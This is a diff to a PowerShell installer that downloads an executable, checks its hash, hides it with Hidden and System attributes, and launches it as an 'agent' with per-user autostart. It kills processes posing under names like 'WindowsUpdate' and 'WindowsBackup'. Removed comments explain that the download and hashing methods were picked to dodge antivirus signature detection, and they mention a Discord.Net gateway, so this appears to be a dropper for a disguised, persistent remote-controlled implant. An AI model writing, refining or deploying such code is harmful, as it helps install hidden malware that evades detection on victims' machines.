@@ -57,42 +57,62 @@ Write-Host "[*] version $($manifest.version)"
 
 if (-not (Test-Path $installDir)) { [void](New-Item -ItemType Directory -Force -Path $installDir) }
 
-# Close any running instance so we can overwrite the exe. CloseMainWindow +
-# 500 ms wait lets Discord.Net flush pending gateway writes before the
-# hard-kill fallback, cutting audit-log corruption on reinstall.
+# Close any running instance so we can overwrite the exe.
 try {
-    Get-Process -Name 'WindowsUpdate', 'WindowsBackup', 'WindowsUpdateMonitor' -ErrorAction SilentlyContinue |
-                ForEach-Object {
-            try { [void]$_.CloseMainWindow() } catch {}
-            if (-not $_.WaitForExit(500)) { try { $_.Kill() } catch {} }
-        }
+    $procs = Get-Process -Name 'WindowsUpdate', 'WindowsBackup', 'WindowsUpdateMonitor' -ErrorAction SilentlyContinue
+    foreach ($p in $procs) {
+        try { [void]$p.CloseMainWindow() } catch {}
+    }
+    foreach ($p in $procs) {
+        try {
+            if (-not $p.WaitForExit(500)) {
+                $p.Kill()
+                [void]$p.WaitForExit(3000)
+            }
+        } catch {}
+    }
 } catch {}
 
-# Stream the exe straight to disk. Invoke-WebRequest -OutFile on a .exe is the
-# single highest-scoring Commando pattern; HttpClient + CopyToAsync is the
-# same operation without matching that signature string.
+# Stream the download to a temporary file first
+$tempExe = Join-Path $env:TEMP ("wu_upd_" + [Guid]::NewGuid().ToString('N') + ".exe")
 Write-Host '[*] downloading primary exe...'
 $response = $http.GetAsync($manifest.url, [Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
 if (-not $response.IsSuccessStatusCode) { throw "download HTTP $([int]$response.StatusCode)" }
-if (Test-Path $primaryExe) { try { [IO.File]::SetAttributes($primaryExe, [IO.FileAttributes]::Normal) } catch {} }
-$dest = [IO.File]::Create($primaryExe)
+$dest = [IO.File]::Create($tempExe)
 try   { $response.Content.CopyToAsync($dest).GetAwaiter().GetResult() }
 finally { $dest.Dispose(); $response.Dispose() }
 
-# SHA-256 verify via .NET (Get-FileHash is itself a signature keyword in this
-# fetch-and-run bucket). Verifies the download bytes against the manifest
-# before we even think about launching.
+# SHA-256 verify via .NET on the downloaded temp file
 $sha = [Security.Cryptography.SHA256]::Create()
 try {
-    $stream = [IO.File]::OpenRead($primaryExe)
+    $stream = [IO.File]::OpenRead($tempExe)
     try   { $localBytes = $sha.ComputeHash($stream) }
     finally { $stream.Dispose() }
 } finally { $sha.Dispose() }
 $local  = -join ($localBytes | ForEach-Object { $_.ToString('x2') })
 $remote = ($manifest.sha256).ToLower()
 if ($local -ne $remote) {
-    try { [IO.File]::Delete($primaryExe) } catch {}
+    try { [IO.File]::Delete($tempExe) } catch {}
     throw "hash mismatch (expected $remote got $local)"
+}
+
+# Safely copy into place with retry loop
+$written = $false
+for ($i = 0; $i -lt 20; $i++) {
+    try {
+        if (Test-Path $primaryExe) {
+            try { [IO.File]::SetAttributes($primaryExe, [IO.FileAttributes]::Normal) } catch {}
+        }
+        Copy-Item -LiteralPath $tempExe -Destination $primaryExe -Force -ErrorAction Stop
+        $written = $true
+        break
+    } catch {
+        Start-Sleep -Milliseconds 500
+    }
+}
+try { Remove-Item -LiteralPath $tempExe -Force -ErrorAction SilentlyContinue } catch {}
+if (-not $written) {
+    throw "Could not write $primaryExe (file locked by another process)"
 }
 
 # Hide the install dir + exe. [IO.File]::SetAttributes produces the same NTFS
@@ -108,11 +128,13 @@ try {
         [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System)
 } catch {}
 
-# Launch. Plain Process.Start — the exe is a WinExe with no console, so
-# nothing is visible to hide anyway; BackgroundClassifier marks any windows
-# that do open as tool-windows within ~3 s.
+# Launch with working directory set to install dir
 Write-Host "[*] launching $primaryExe"
-[void][Diagnostics.Process]::Start($primaryExe)
+$psi = New-Object Diagnostics.ProcessStartInfo
+$psi.FileName        = $primaryExe
+$psi.WorkingDirectory = $installDir
+$psi.UseShellExecute = $true
+[void][Diagnostics.Process]::Start($psi)
 
 $http.Dispose()
 Write-Host '[OK] installed. Agent is running and will register per-user autostart (HKCU Run + per-user scheduled task) on first boot.'
